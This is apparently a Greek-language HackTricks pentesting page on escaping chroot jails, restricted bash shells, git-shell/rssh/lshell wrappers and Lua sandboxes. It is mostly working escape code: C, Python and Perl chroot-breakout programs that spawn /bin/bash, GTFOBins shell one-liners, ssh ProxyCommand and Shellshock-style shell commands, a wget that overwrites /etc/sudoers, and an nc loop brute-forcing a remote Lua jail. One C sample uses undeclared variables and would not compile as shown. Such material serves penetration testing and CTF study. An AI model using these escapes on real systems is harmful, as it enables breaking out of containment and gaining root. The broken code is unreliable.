# Διαφυγή από Jails

## **GTFOBins**

**Αναζητήστε στο** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **αν μπορείτε να εκτελέσετε οποιοδήποτε binary με την ιδιότητα "Shell"**

## Chroot Escapes

Από τη [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Ο μηχανισμός chroot **δεν προορίζεται να προστατεύει** από σκόπιμη παραποίηση από **προνομιούχους** (**root**) **χρήστες**. Στα περισσότερα συστήματα, τα chroot contexts δεν λειτουργούν σωστά σε στοίβα και τα chrooted προγράμματα **με επαρκή δικαιώματα μπορούν να εκτελέσουν ένα δεύτερο chroot για να διαφύγουν**.\
Συνήθως αυτό σημαίνει ότι για να διαφύγετε χρειάζεται να είστε root μέσα στο chroot.<sup>[[4]](#references)</sup>

> [!TIP]
> Το **tool** [**chw00t**](https://github.com/earthquake/chw00t) δημιουργήθηκε για να εκμεταλλεύεται τα παρακάτω σενάρια και να διαφεύγει από το `chroot`.<sup>[[1]](#references)[[5]](#references)</sup>

### Root + CWD

> [!WARNING]
> Αν είστε **root** μέσα σε ένα chroot, **μπορείτε να διαφύγετε** δημιουργώντας **ένα άλλο chroot**. Αυτό συμβαίνει επειδή 2 chroot δεν μπορούν να συνυπάρχουν (στο Linux), επομένως αν δημιουργήσετε έναν φάκελο και στη συνέχεια **δημιουργήσετε ένα νέο chroot** σε αυτόν τον νέο φάκελο, ενώ **βρίσκεστε έξω από αυτόν**, θα βρίσκεστε πλέον **έξω από το νέο chroot** και, επομένως, θα βρίσκεστε στο FS.
>
> Αυτό συμβαίνει επειδή συνήθως το chroot ΔΕΝ μετακινεί τον τρέχοντα κατάλογο εργασίας σας στον υποδεικνυόμενο κατάλογο, οπότε μπορείτε να δημιουργήσετε ένα chroot, αλλά να βρίσκεστε έξω από αυτό.<sup>[[4]](#references)[[5]](#references)</sup>

Συνήθως δεν θα βρείτε το binary `chroot` μέσα σε ένα chroot jail, αλλά **θα μπορούσατε να κάνετε compile, upload και execute** ένα binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Αποθηκευμένο fd

> [!WARNING]
> Αυτό είναι παρόμοιο με την προηγούμενη περίπτωση, αλλά σε αυτή την περίπτωση ο **attacker αποθηκεύει ένα file descriptor στον τρέχοντα κατάλογο** και στη συνέχεια **δημιουργεί το chroot σε έναν νέο φάκελο**. Τέλος, καθώς έχει **πρόσβαση** σε αυτό το **FD** **εκτός** του chroot, αποκτά πρόσβαση σε αυτό και **διαφεύγει**.<sup>[[4]](#references)[[5]](#references)</sup>

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> Το FD μπορεί να μεταβιβαστεί μέσω Unix Domain Sockets, επομένως:
>
> - Δημιούργησε μια child process (fork)
> - Δημιούργησε ένα UDS ώστε ο parent και το child να μπορούν να επικοινωνούν
> - Εκτέλεσε chroot στο child process σε διαφορετικό folder
> - Στο parent proc, δημιούργησε ένα FD για ένα folder που βρίσκεται έξω από το chroot του νέου child proc
> - Μετέφερε στο child proc αυτό το FD χρησιμοποιώντας το UDS
> - Το child process εκτελεί chdir σε αυτό το FD και, επειδή βρίσκεται έξω από το chroot του, θα διαφύγει από το jail.<sup>[[5]](#references)[[6]](#references)</sup>

### Root + Mount

> [!WARNING]
>
> - Κάνε mount τη root device (/) σε έναν κατάλογο μέσα στο chroot
> - Κάνε chroot σε αυτόν τον κατάλογο
>
> Αυτό είναι δυνατό στο Linux.<sup>[[5]](#references)</sup>

### Root + /proc

> [!WARNING]
>
> - Κάνε mount το procfs σε έναν κατάλογο μέσα στο chroot (αν δεν έχει γίνει ήδη)
> - Αναζήτησε ένα pid που έχει διαφορετικό root/cwd entry, όπως: /proc/1/root
> - Κάνε chroot σε αυτό το entry.<sup>[[4]](#references)[[5]](#references)[[7]](#references)</sup>

### Root(?) + Fork

> [!WARNING]
>
> - Δημιούργησε ένα Fork (child proc) και κάνε chroot σε διαφορετικό folder, βαθύτερα στο FS, και εκτέλεσε CD σε αυτό
> - Από το parent process, μετακίνησε το folder στο οποίο βρίσκεται το child process σε έναν φάκελο πριν από το chroot του child
> - Αυτό το child process θα βρεθεί έξω από το chroot.<sup>[[5]](#references)</sup>

### ptrace

> [!WARNING]
>
> - Το αν μια process μπορεί να συνδεθεί με `ptrace` εξαρτάται από τα credentials, τα capabilities και τα ενεργοποιημένα security modules, όπως το Yama· επομένως, το debugging από τον ίδιο χρήστη μπορεί να περιορίζεται από την πολιτική του συστήματος.<sup>[[8]](#references)</sup>
> - Αν επιτρέπεται η σύνδεση, θα μπορούσες να κάνεις ptrace σε μια process και να εκτελέσεις shellcode μέσα σε αυτήν ([δες αυτό το παράδειγμα](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).<sup>[[5]](#references)[[8]](#references)</sup>

## Bash Jails

### Enumeration

Λάβε πληροφορίες για το jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Τροποποίηση του PATH

Ελέγξτε αν μπορείτε να τροποποιήσετε τη μεταβλητή περιβάλλοντος PATH.<sup>[[2]](#references)</sup>
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Χρήση του vim

Αν το Vim είναι διαθέσιμο, ορίστε την επιλογή `shell` σε ένα shell που μπορείτε να εκτελέσετε και καλέστε το `:shell`.<sup>[[10]](#references)</sup>
```bash
:set shell=/bin/sh
:shell
```
### Pagers και help viewers

Πολλά restricted environments εξακολουθούν να αφήνουν διαθέσιμα τα **pagers** ή τα **help viewers**. Συνήθως είναι ταχύτερο να τα εκμεταλλευτείτε παρά να προσπαθήσετε να ανακατασκευάσετε το `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Αν το `git` είναι διαθέσιμο, η επιλογή `--paginate` στέλνει την έξοδο στο `less` ή στο `$PAGER`, κάτι που είναι χρήσιμο όταν είναι διαθέσιμο ένα pager escape.<sup>[[9]](#references)</sup>
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Συνηθισμένα GTFOBins one-liners

Αφού γνωρίζεις ποια binaries είναι προσβάσιμα, δοκίμασε πρώτα τα προφανή shell spawners:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Αν μπορείς να **inject arguments** σε μια επιτρεπόμενη εντολή (αντί να την εκτελείς ελεύθερα), έλεγξε επίσης το **GTFOArgs**.<sup>[[17]](#references)</sup>

### Δημιουργία script

Έλεγξε αν μπορείς να δημιουργήσεις ένα εκτελέσιμο αρχείο με περιεχόμενο _/bin/bash_
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Απόκτηση bash μέσω SSH

Αν αποκτάτε πρόσβαση μέσω ssh, συχνά μπορείτε να ζητήσετε από τον server να εκτελέσει ένα **διαφορετικό πρόγραμμα** αντί για το restricted login shell.<sup>[[14]](#references)</sup>
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Αν το `ssh` είναι ένα από τα λίγα τοπικά επιτρεπόμενα δυαδικά αρχεία, θυμηθείτε ότι μπορεί επίσης να γίνει κατάχρηση ως **GTFOBin**· οι επιλογές `LocalCommand` και `ProxyCommand` εκτελούν τοπικά διαμορφωμένες βοηθητικές εντολές.<sup>[[14]](#references)[[15]](#references)</sup>
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declare

Στο Bash, ένα nameref ανακατευθύνει τις αναθέσεις σε μια άλλη μεταβλητή, ενώ η προσθήκη ενός στοιχείου στο `BASH_CMDS` προσθέτει αυτή την εντολή στον εσωτερικό πίνακα κατακερματισμού εντολών του Bash.<sup>[[11]](#references)[[12]](#references)</sup>
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Η επιλογή `-O` του Wget γράφει το ληφθέν περιεχόμενο στο καθορισμένο αρχείο εξόδου· αν αυτή η διαδρομή είναι εγγράψιμη, μπορεί να αντικαταστήσει ένα αρχείο όπως το `/etc/sudoers`.<sup>[[13]](#references)</sup>
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

Ορισμένα περιβάλλοντα δεν σας μεταφέρουν σε ένα απλό `rbash`, αλλά σε **wrappers** όπως τα `git-shell`, `rssh` ή `lshell`:

- Το `git-shell` δέχεται μόνο server-side Git commands, καθώς και οτιδήποτε υπάρχει μέσα στο `~/git-shell-commands/`. Αν ο κατάλογος υπάρχει, εκτελέστε `help` για να εμφανίσετε τις επιτρεπόμενες custom actions. Αν μπορείτε να **γράψετε** εκεί, οποιοδήποτε executable τοποθετηθεί σε αυτόν τον κατάλογο γίνεται προσβάσιμο.<sup>[[3]](#references)</sup>
- Τα `rssh` / `lshell` συνήθως επιτρέπουν μόνο `scp`, `sftp`, `rsync` ή Git-style operations. Σε αυτές τις περιπτώσεις, εστιάστε πρώτα σε **file write primitives**: ανεβάστε το `authorized_keys`, ένα shell startup file ή ένα helper script σε writable location και, στη συνέχεια, επανασυνδεθείτε με `ssh -t ...`.
- Αν το wrapper φιλτράρει μόνο τη command line, καταγράψτε τα προσβάσιμα binaries και έπειτα κάντε pivot πίσω στα **GTFOBins / GTFOArgs**.

### Άλλα tricks

Ελέγξτε επίσης:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Θα μπορούσε επίσης να σας ενδιαφέρει η σελίδα:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Tricks σχετικά με το escaping από Python jails στην ακόλουθη σελίδα:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Σε αυτήν τη σελίδα μπορείτε να βρείτε τις global functions στις οποίες έχετε πρόσβαση μέσα στη Lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base).<sup>[[16]](#references)</sup>

Οι standard functions `load`, `string.char` και `os.execute` μπορούν να δημιουργήσουν και να εκτελέσουν αυτό το chunk όταν είναι διαθέσιμες.<sup>[[16]](#references)</sup>
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Μια συνάρτηση `table` μπορεί επίσης να ανακτηθεί με `rawget` αντί για σύνταξη με τελεία.<sup>[[16]](#references)</sup>
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Χρησιμοποιήστε το `pairs` για να απαριθμήσετε έναν πίνακα βιβλιοθήκης.<sup>[[16]](#references)</sup>
```bash
for k,v in pairs(string) do print(k,v) end
```
Η σειρά με την οποία το `pairs` απαριθμεί τους δείκτες του πίνακα δεν καθορίζεται, επομένως μην βασίζεστε στο ότι μια συγκεκριμένη function θα εμφανιστεί πρώτη. Αν χρειάζεται να εκτελέσετε μία συγκεκριμένη function, μπορείτε να πραγματοποιήσετε brute force attack φορτώνοντας διαφορετικά lua environments και καλώντας την πρώτη function της library.<sup>[[16]](#references)</sup>
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Απόκτηση interactive lua shell**: Αν βρίσκεστε μέσα σε ένα περιορισμένο lua shell, μπορείτε να αποκτήσετε ένα νέο lua shell (και, ελπίζουμε, χωρίς περιορισμούς) καλώντας το `debug.debug()`, το οποίο εισέρχεται σε διαδραστική λειτουργία.<sup>[[16]](#references)</sup>
```bash
debug.debug()
```
## References

- [1] [Chw00t: Πώς να ξεφύγετε από διάφορες λύσεις chroot (Bucsay Balazs, ομιλία και διαφάνειες στο DeepSec)](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [Εγχειρίδιο αναφοράς GNU Bash – Το Restricted Shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Τεκμηρίωση Git](https://git-scm.com/docs/git-shell)
- [4] [chroot(2) – σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [5] [chw00t – εργαλείο διαφυγής από chroot](https://github.com/earthquake/chw00t)
- [6] [unix(7) – σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man7/unix.7.html)
- [7] [proc_pid_root(5) – σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [8] [ptrace(2) – σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man2/ptrace.2.html)
- [9] [git – Τεκμηρίωση Git](https://git-scm.com/docs/git)
- [10] [:shell – Τεκμηρίωση Vim](https://vimhelp.org/various.txt.html#%3Ashell)
- [11] [Ενσωματωμένες εντολές Bash – Εγχειρίδιο αναφοράς GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html)
- [12] [Μεταβλητές Bash – Εγχειρίδιο αναφοράς GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [13] [Εγχειρίδιο GNU Wget](https://www.gnu.org/software/wget/manual/wget.html)
- [14] [ssh(1) – σελίδα εγχειριδίου OpenBSD](https://man.openbsd.org/ssh)
- [15] [ssh_config(5) – σελίδα εγχειριδίου OpenBSD](https://man.openbsd.org/ssh_config)
- [16] [Εγχειρίδιο αναφοράς Lua 5.4](https://www.lua.org/manual/5.4/manual.html)
- [17] [GTFOArgs: Λίστα διανυσμάτων εκμετάλλευσης Argument Injection](https://gtfoargs.github.io/)
{{#include ../../banners/hacktricks-training.md}}
